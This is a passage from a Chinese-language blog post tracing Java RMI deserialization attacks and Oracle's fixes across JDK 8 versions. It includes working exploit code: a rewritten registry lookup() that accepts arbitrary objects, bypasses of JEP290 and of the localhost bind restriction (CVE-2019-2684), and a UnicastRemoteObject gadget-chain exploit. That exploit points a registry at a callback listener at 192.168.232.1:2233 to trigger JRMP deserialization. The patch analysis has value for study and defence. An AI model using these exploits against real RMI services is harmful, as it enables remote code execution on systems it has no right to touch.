class="hljs-keyword">if</span> (var4) &#123;<br>                var6.set<span class="hljs-constructor">AckNeeded()</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DGCClient</span>.</span></span>register<span class="hljs-constructor">Refs(<span class="hljs-params">var2</span>, Arrays.<span class="hljs-params">asList</span>(<span class="hljs-params">var5</span>)</span>);<br>        &#125;<br><br>  <br>jdk1.<span class="hljs-number">8.0_231</span>\jre\lib\rt.jar!\sun\rmi\transport\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConnectionInputStream</span>.</span></span><span class="hljs-keyword">class</span><br>void save<span class="hljs-constructor">Ref(LiveRef <span class="hljs-params">var1</span>)</span> &#123;<br>        Endpoint var2 = var1.get<span class="hljs-constructor">Endpoint()</span>;<br>        Object var3 = (List)this.incomingRefTable.get(var2);<br>        <span class="hljs-keyword">if</span> (var3<span class="hljs-operator"> == </span>null) &#123;<br>            var3 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ArrayList()</span>;<br>            this.incomingRefTable.put(var2, var3);    <span class="hljs-comment">//2</span><br>        &#125;<br><br>        ((List)var3).add(var1);<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/11.png"></p><p>sun.rmi.transport.StreamRemoteCall#executeCall 对JRMP返回的数据进行反序列化操作</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/12.png"></p><p>相对应的EXP构造在ysoserial.exploit.JRMPListener#doCall中，先往数据流写入ExceptionalReturn值(2)，接着写入我们的恶意Payload</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/13.png"></p><h5 id="2-3-3-Remote接口类包装UnicastRef类"><a href="#2-3-3-Remote接口类包装UnicastRef类" class="headerlink" title="2.3.3 Remote接口类包装UnicastRef类"></a>2.3.3 Remote接口类包装UnicastRef类</h5><p>利用思路是没问题了，但是还有一个问题：我们如何将UnicastRef发送到RMI Registry，这个类并没有实现Remote接口，所以无法直接绑定到注册中心</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/14.png"></p><p>只有将UnicastRef对象包装为Remote类型才能继续绑定。有几种方法能做到：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">1</span>、利用动态代理，可指定任意接口类型<br><span class="hljs-number">2</span>、找一个实现<span class="hljs-comment">Remote接口且存在UnicastRef类型的字段的类进行包装</span><br></code></pre></td></tr></table></figure><p>其实ysoserial.exploit.RMIRegisterExploit中使用的就是第一种方法，作者使用的handler是sun.reflect.annotation.AnnotationInvocationHandler，将其动态代理为Remote类型。但是这个类并不在JEP290白名单中，无法满足要求。所以需要重新找。</p><p>第二种思路，找到了RemoteObjectInvocationHandler，这个类的父类RemoteObject具有一个RemoteRef类型（UnicastRef实现了此接口）的属性，并且本身实现了Remote接口。满足我们的要求</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/15.png"></p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/16.png"></p><p>但是我们可以看到ref属性是transient 关键字修饰，表明ref属性默认不被序列化，那我们找的这个类是不是不满足需求了呢？并不是！我们查看RemoteObjectInvocationHandler父类java.rmi.server.RemoteObject重写了writeObject()，其利用了writeExternal来写入被transient 修饰的ref属性值。所以依旧可以被反序列化</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/17.png"></p><p>我们直接使用RemoteObjectInvocationHandler包裹下UnicastRef对象即可。</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/18.png"></p><p><strong>而ysoserial.payloads.JRMPClient中利用了RemoteObjectInvocationHandler可动态代理为任意接口的特性，将UnicastRef对象转化为Remote子接口Registry进行传递。其实不用这么复杂，直接使用RemoteObjectInvocationHandler包装一下就OK了</strong></p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/19.png"></p><p>综上看来，RemoteObject其实更符合我们的要求：属性ref可包裹UnicastRef对象，其本身又实现了Remote接口。那他的子类理论上来说均是可以满足要求的。</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/20.png"></p><p>但是事实并不是我们想象的那样，调试发现在操作序列化写入数据时，会进行判断(enableReplace值默认为true)，如果满足”目标类实现Remote接口 &amp;&amp; 未实现RemoteStub接口 &amp;&amp;  “则会将我们构造的恶意类替换。从而导致攻击利用失败。如下是调用过程替换方法replaceObject()的逻辑代码</p><p>java.io.ObjectOutputStream#writeObject0</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/21.png"></p><p>sun.rmi.server.MarshalOutputStream#replaceObject</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/22.png"></p><p>而RemoteStub是RemoteObject的子类，所以我们要找的目标类只需要缩小范围，只找RemoteStub子类即可满足要求。</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/23.png"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">RMIConnectionImpl_Stub、RMIServerImpl_Stub、ActivationGroup_Stub、DGCImpl_Stub、Activation<span class="hljs-symbol">$Activatio</span>nSystemImpl_Stub、ReferenceWrapper_Stub、RegistryImpl_Stub<br></code></pre></td></tr></table></figure><p>经测试，这些类直接包裹unicastRef对象就可以完成利用</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/24.png"></p><p>另外也可以利用反射修改enableReplace值，则RemoteObject的子类均可用了</p><h3 id="3、jdk-x3D-8u141"><a href="#3、jdk-x3D-8u141" class="headerlink" title="3、jdk &#x3D; 8u141"></a>3、jdk &#x3D; 8u141</h3><h4 id="3-1-限制1：RMI-bind-x2F-rebind-x2F-unbind-操作限制来源地址为本地"><a href="#3-1-限制1：RMI-bind-x2F-rebind-x2F-unbind-操作限制来源地址为本地" class="headerlink" title="3.1 限制1：RMI bind&#x2F;rebind&#x2F;unbind 操作限制来源地址为本地"></a>3.1 限制1：RMI bind&#x2F;rebind&#x2F;unbind 操作限制来源地址为本地</h4><blockquote><p>其实在jdk的早期版本中bind&#x2F;unbind&#x2F;rebind操作都会限制地址，只不过校验是在反序列化之后进行的，所以并没有对我们进行漏洞利用产生影响。但是在8u141的更新中限制了RMI bind&#x2F;rebind&#x2F;unbind 操作限制来源地址为本地地址。如下图是jdk8u121的sun&#x2F;rmi&#x2F;registry&#x2F;RegistryImpl_Skel.java#dispatch()代码：反序列化操作完成之后才进行sun.rmi.registry.RegistryImpl#checkAccess地址检测</p></blockquote><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/25.png"></p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/26.png"></p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/27.png"></p><p>oracle官方在8u141对此处做了修改，防止外部攻击者的恶意对注册表进行bind&#x2F;unbind操作。下面是jdk8u121与8u141的对比，可以发现将checkAccess操作提前至反序列化之前。</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/28.png"></p><p>这就影响了ysoserial.exploit.RMIRegistryExploit的使用，此exp正是通过bind恶意类到注册中心完成攻击的。那有没有其他操作可以帮助我们完成恶意序列数据的传递呢。观察同文件下的其他操作，lookup()用于客户端向注册端查询，直接对数据流进行readObject()操作，并且没有checkAccess()地址来源校验。满足我们的要求</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/29.png"></p><h4 id="3-2-绕过1：RMI-lookup-绕过对来源地址的限制"><a href="#3-2-绕过1：RMI-lookup-绕过对来源地址的限制" class="headerlink" title="3.2 绕过1：RMI lookup 绕过对来源地址的限制"></a>3.2 绕过1：RMI lookup 绕过对来源地址的限制</h4><p>根据上一小节描述，我们可以晓得在8u141及之后，即使使用白名单中的UnicastRef类绕过了JEP290，官方对bind&#x2F;unbind&#x2F;rebind操作的限制来源为本地，导致无法完成利用。我们看到在同文件下的lookup方法满足要求（1、未检查来源地址；2、虽然传递的是String类型参数，但是在写入使用的是writeObject操作），我们无法直接拿sun.rmi.registry.RegistryImpl_Stub#lookup来使用，需要进行简单改造，使其支持传入Object类型参数</p><p>sun.rmi.registry.RegistryImpl_Stub#lookup</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/30.png"></p><p>我们仿照逻辑重写一个支持传入Object类型参数的lookup方法</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> Remote lookup(Registry registry,Object var1) throws Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            RemoteRef ref = (RemoteRef) Reflections.getFieldValue(registry,<span class="hljs-string">&quot;ref&quot;</span>);<br>            Operation[] operations = <span class="hljs-keyword">new</span> <span class="hljs-type">Operation</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-type">Operation</span>(<span class="hljs-string">&quot;void bind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-type">Operation</span>(<span class="hljs-string">&quot;java.lang.String list()[]&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-type">Operation</span>(<span class="hljs-string">&quot;java.rmi.Remote lookup(java.lang.String)&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-type">Operation</span>(<span class="hljs-string">&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-type">Operation</span>(<span class="hljs-string">&quot;void unbind(java.lang.String)&quot;</span>)&#125;;<br>            RemoteCall var2 = ref.<span class="hljs-keyword">new</span><span class="hljs-type">Call</span>((RemoteObject) registry, operations, <span class="hljs-number">2</span>, <span class="hljs-number">4905912898345647071</span>L);<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                ObjectOutput var3 = var2.getOutputStream();<br>                var3.writeObject(var1);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException var18) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">MarshalException</span>(<span class="hljs-string">&quot;error marshalling arguments&quot;</span>, var18);<br>            &#125;<br><br>            ref.invoke(var2);<br><br><span class="hljs-comment">//处理返回信息的代码逻辑也可以删除</span><br>            Remote var23;<br>            <span class="hljs-keyword">try</span> &#123;<br>                ObjectInput var6 = var2.getInputStream();<br>                var23 = (Remote)var6.readObject();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException var15) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var15);<br>            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var16) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var16);<br>            &#125; finally &#123;<br>                ref.done(var2);<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> var23;<br>        &#125; <span class="hljs-keyword">catch</span> (RuntimeException var19) &#123;<br>            <span class="hljs-keyword">throw</span> var19;<br>        &#125; <span class="hljs-keyword">catch</span> (RemoteException var20) &#123;<br>            <span class="hljs-keyword">throw</span> var20;<br>        &#125; <span class="hljs-keyword">catch</span> (NotBoundException var21) &#123;<br>            <span class="hljs-keyword">throw</span> var21;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var22) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">UnexpectedException</span>(<span class="hljs-string">&quot;undeclared checked exception&quot;</span>, var22);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/31.png"></p><h4 id="3-3-绕过2：绕过本地地址限制（CVE-2019-2684）"><a href="#3-3-绕过2：绕过本地地址限制（CVE-2019-2684）" class="headerlink" title="3.3 绕过2：绕过本地地址限制（CVE-2019-2684）"></a>3.3 绕过2：绕过本地地址限制（CVE-2019-2684）</h4><p>在1.2节我们演示了构造DGC层数据的构造、在3.2节我们重写了lookup方法使其可以传入Object类型的参数。对于此类RPC的调用，数据全部由客户端构造，攻击者可以任意更改传输数据去应对服务端的过滤处理逻辑。而回到我们这里讨论的JDK8u141加上localhost限制，我们类比DGC层数据构造、改造lookup方法的操作，可以动手改造bind方法去解决。关于该绕过，貌似关注的人极少。且Ysoserial也未对此限制绕过编写EXP，所以这里动手写一下。具体思路由如下两种：</p><p>1、重写bind逻辑，使得在判断时进入lookup的处理逻辑进而触发UnicastRef反序列化链。</p><p>2、重写bind逻辑，使服务端进入“调用自定义方法“的逻辑，而自定义方法的参数是序列化参数，并未进入oldDispatch，导致可以绕过localhost的判断</p><p>思路1其实本质来说与3.2的绕过1是相同的，均利用了未做鉴权的lookup方法</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/32.png"></p><p>绕过的exp 1：</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/33.png"></p><p>我们看下思路2：</p><p>当opnum&lt;0时表明是用户自定义方法，服务端根据<code>hashToMethod_Map.get(方法hash值)</code>确认目标方法。但是其内置了Registry的5个操作方法，我们只需要传入对应方法的hash值即可。</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/34.png"></p><p>最终使用sun.rmi.server.UnicastRef#unmarshalValue组装”自定义方法参数”时调用readObject设置JRMP反向连接、releaseInputStream()释放数据流时请求恶意服务触发二次反序列化</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/35.png"></p><p>最终通过重写lookup、bind的方式完成了本地地址限制的绕过</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/36.png"></p><h3 id="4、jdk-x3D-8u231"><a href="#4、jdk-x3D-8u231" class="headerlink" title="4、jdk &#x3D; 8u231"></a>4、jdk &#x3D; 8u231</h3><h4 id="4-1-限制1：RMI-修复UnicastRef链绕过的问题"><a href="#4-1-限制1：RMI-修复UnicastRef链绕过的问题" class="headerlink" title="4.1 限制1：RMI 修复UnicastRef链绕过的问题"></a>4.1 限制1：RMI 修复UnicastRef链绕过的问题</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRef<span class="hljs-selector-id">#readExternal</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.LiveRef<span class="hljs-selector-id">#read</span><br><span class="hljs-comment">//sun.rmi.transport.StreamRemoteCall#releaseInputStream//修复1</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.DGCClient<span class="hljs-selector-id">#registerRefs</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.DGCClient</span>.EndpointEntry<span class="hljs-selector-id">#registerRefs</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.DGCClient</span>.EndpointEntry<span class="hljs-selector-id">#makeDirtyCall</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.DGCImpl_Stub<span class="hljs-selector-id">#dirty</span><span class="hljs-comment">//修复2</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRef<span class="hljs-selector-id">#invoke</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.StreamRemoteCall<span class="hljs-selector-id">#executeCall</span><br>java<span class="hljs-selector-class">.io</span>.ObjectInputStream#readObject<br></code></pre></td></tr></table></figure><h5 id="4-1-1-清除UnicastRef的反连地址"><a href="#4-1-1-清除UnicastRef的反连地址" class="headerlink" title="4.1.1 清除UnicastRef的反连地址"></a>4.1.1 清除UnicastRef的反连地址</h5><p>在JDK8U231版本在sun.rmi.registry.RegistryImpl_Skel#dispatch处理bind、lookup、rebind、unbind操作时增加了sun.rmi.transport.StreamRemoteCall#discardPendingRefs方法，当反序列化时发生IO&#x2F;类找不到或类型转换错误时，会调用sun.rmi.transport.ConnectionInputStream#discardRefs方法，去掉UnicastRef的反连地址(之前存储地址时使用的是ConnectionInputStream#saveRef)，导致UnicastRef JRMP外连链无法利用</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/37.png"></p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/38.png"></p><p>当服务端处理“由客户端改造的lookup()传输的UnicastRef恶意数据”时，readObject会正常执行，但是当转为String类型时触发catch ClassCastException错误，进入discardPendingRefs进行清除数据。我们可以看到incomingRefTable在处理前后的对比</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/39.png"></p><p>执行discardPendingRefs操作后</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/40.png"></p><h5 id="4-1-2-对反连拿到的对象进行白名单校验"><a href="#4-1-2-对反连拿到的对象进行白名单校验" class="headerlink" title="4.1.2 对反连拿到的对象进行白名单校验"></a>4.1.2 对反连拿到的对象进行白名单校验</h5><p>另外Registry在处理JRMP反连操作时会最终会调用到sun.rmi.transport.DGCImpl_Stub#dirty方法，并在this.ref.invoke(var5);操作中触发反序列化操作，8u231在invoke前增加了白名单限制sun.rmi.transport.DGCImpl_Stub#leaseFilter导致</p><p>返回的序列化对象无法通过检测</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/41.png"></p><p>leaseFilter白名单：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">UID<span class="hljs-selector-class">.class</span><br>VMID<span class="hljs-selector-class">.class</span><br>Lease<span class="hljs-selector-class">.class</span><br>Throwable<br><span class="hljs-string">&quot;java.lang.*&quot;</span><br><span class="hljs-string">&quot;java.rmi.*&quot;</span><br>StackTraceElement<span class="hljs-selector-class">.class</span><br>ArrayList<span class="hljs-selector-class">.class</span><br>Object<span class="hljs-selector-class">.class</span><br>java<span class="hljs-selector-class">.util</span>.Collections<span class="hljs-variable">$UnmodifiableList</span><br>java<span class="hljs-selector-class">.util</span>.Collections<span class="hljs-variable">$UnmodifiableCollection</span><br>java<span class="hljs-selector-class">.util</span>.Collections<span class="hljs-variable">$UnmodifiableRandomAccessList</span><br>java<span class="hljs-selector-class">.util</span>.Collections<span class="hljs-variable">$EmptyList</span><br></code></pre></td></tr></table></figure><h4 id="4-2-绕过1：使用UnicastRemoteObject链绕过修复"><a href="#4-2-绕过1：使用UnicastRemoteObject链绕过修复" class="headerlink" title="4.2 绕过1：使用UnicastRemoteObject链绕过修复"></a>4.2 绕过1：使用UnicastRemoteObject链绕过修复</h4><p><strong>这条链与 之前绕过JEP290的UnicastRef 链不同之处在与它并不是在 StreamRemoteCall#releaseInputStream中触发JRMP外连，而是在调用readObject的时候就触发了，所以可以绕过8u231的修复补丁</strong>。这条链是由An Trinh 发现并在19年Blackhat上公布的，详情可参考：<a href="https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf">https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf</a></p><p>相当于从UnicastRemoteObject.readObject()通过”一系列操作“ 最终调用到了UnicastRef.invoke()，刚好绕过官方的两步修复方案。UnicastRef链及8u231的修复方案</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">UnicastRef gadget chain：<br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRef<span class="hljs-selector-id">#readExternal</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.LiveRef<span class="hljs-selector-id">#read</span><br><span class="hljs-comment">//sun.rmi.transport.StreamRemoteCall#releaseInputStream//修复1</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.DGCClient<span class="hljs-selector-id">#registerRefs</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.DGCClient</span>.EndpointEntry<span class="hljs-selector-id">#registerRefs</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.DGCClient</span>.EndpointEntry<span class="hljs-selector-id">#makeDirtyCall</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.DGCImpl_Stub<span class="hljs-selector-id">#dirty</span><span class="hljs-comment">//修复2</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRef<span class="hljs-selector-id">#invoke</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.StreamRemoteCall<span class="hljs-selector-id">#executeCall</span><br>java<span class="hljs-selector-class">.io</span>.ObjectInputStream#readObject<br></code></pre></td></tr></table></figure><p>我们观察修复方案可以发现：官方并没有处理sun.rmi.server.UnicastRef#invoke之后的操作，相当于sink点没变，绕过补丁需要找一处反序列化的source点，source点需要满足如下条件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">1、白名单中的类(可绕过JEP290)，并且存在readObject/readExternal方法<br>2、readObject/readExternal方法最终可以触发UnicastRef<span class="hljs-comment">#invoke</span><br>3、因为RemoteObjectInvocationHandler的特点：<br>  a、存在RemoteRef类型（UnicastRef的父类）的属性（ref）<br>  b、RemoteObjectInvocationHandler<span class="hljs-comment">#invoke会调用ref.invoke</span><br>  c、RemoteObjectInvocationHandler本身实现了InvocationHandler，可作为动态代理的处理handler，在调用被代理接口方法时会先调用RemoteObjectInvocationHandler<span class="hljs-comment">#invoke</span><br>所以条件2就变成了：反序列化方法中最终可以触发其属性的方法，属性接口使用RemoteObjectInvocationHandler代理即可<br></code></pre></td></tr></table></figure><p>顺着这个思路，找到JEP290的白名单中有个java.rmi.server.UnicastRemoteObject，这个类的readObject()方法最终会调用到其属性值ssf的createServerSocket方法</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/42.png"></p><p>这里用到了动态代理的特性：当调用ssf属性的createServerSocket方法时，会调用handler.invoke()，即这里会调用RemoteObjectInvocationHandler#invoke</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/43.png"></p><p>而RemoteObjectInvocationHandler的ref属性为我们构造的UnicastRef对象，所以会调用到sun.rmi.server.UnicastRef#invoke(java.rmi.Remote, java.lang.reflect.Method, java.lang.Object[], long)，接下来就与UnicastRef链一致了</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/44.png"></p><p>最终的调用链：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">UnicastRemoteObject gadget chain：<br>java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRemoteObject<span class="hljs-selector-id">#readObject</span><br>java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRemoteObject<span class="hljs-selector-id">#reexport</span><br>java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRemoteObject<span class="hljs-selector-id">#exportObject</span><br>...<br>            sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.tcp</span>.TCPTransport<span class="hljs-selector-id">#listen</span><br>                sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.tcp</span>.TCPEndpoint<span class="hljs-selector-id">#newServerSocket</span><br>                com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.proxy</span>.<span class="hljs-variable">$Proxy1</span><span class="hljs-selector-class">.createServerSocket</span>()<br>                    java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.RemoteObjectInvocationHandler<span class="hljs-selector-id">#invoke</span><br>                        java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.RemoteObjectInvocationHandler<span class="hljs-selector-id">#invokeRemoteMethod</span><br>                        sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRef<span class="hljs-selector-id">#invoke</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.StreamRemoteCall<span class="hljs-selector-id">#executeCall</span><br>java<span class="hljs-selector-class">.io</span>.ObjectInputStream#readObject<br></code></pre></td></tr></table></figure><p>编写exp：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">gen<span class="hljs-constructor">UnicastRef()</span>为生成UnicastRef对象的方法<br>lookup<span class="hljs-literal">()</span>为我们重写的方法，可以传入Object类型<br><br>Registry registry = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LocateRegistry</span>.</span></span>get<span class="hljs-constructor">Registry(<span class="hljs-string">&quot;192.168.232.8&quot;</span>, 1099)</span>;<br>RemoteObjectInvocationHandler remoteObjectInvocationHandler = <span class="hljs-keyword">new</span> <span class="hljs-constructor">RemoteObjectInvocationHandler(<span class="hljs-params">genUnicastRef</span>(<span class="hljs-string">&quot;192.168.232.1&quot;</span>,2233)</span>);<br>RMIServerSocketFactory rmiServerSocketFactory = (RMIServerSocketFactory) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Proxy</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(RMIServerSocketFactory.<span class="hljs-params">class</span>.<span class="hljs-params">getClassLoader</span>()</span>, <span class="hljs-keyword">new</span> Class<span class="hljs-literal">[]</span>&#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RMIServerSocketFactory</span>.</span></span><span class="hljs-keyword">class</span>,<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Remote</span>.</span></span><span class="hljs-keyword">class</span>&#125;, remoteObjectInvocationHandler);<br>Constructor constructor = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">UnicastRemoteObject</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">null</span>)</span>;<br>constructor.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>UnicastRemoteObject unicastRemoteObject = (UnicastRemoteObject) constructor.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">null</span>)</span>;<br>Field ssf = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">UnicastRemoteObject</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;ssf&quot;</span>)</span>;<br>ssf.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>ssf.set(unicastRemoteObject, rmiServerSocketFactory);<br>lookup(registry, unicastRemoteObject);<br></code></pre></td></tr></table></figure><p><img 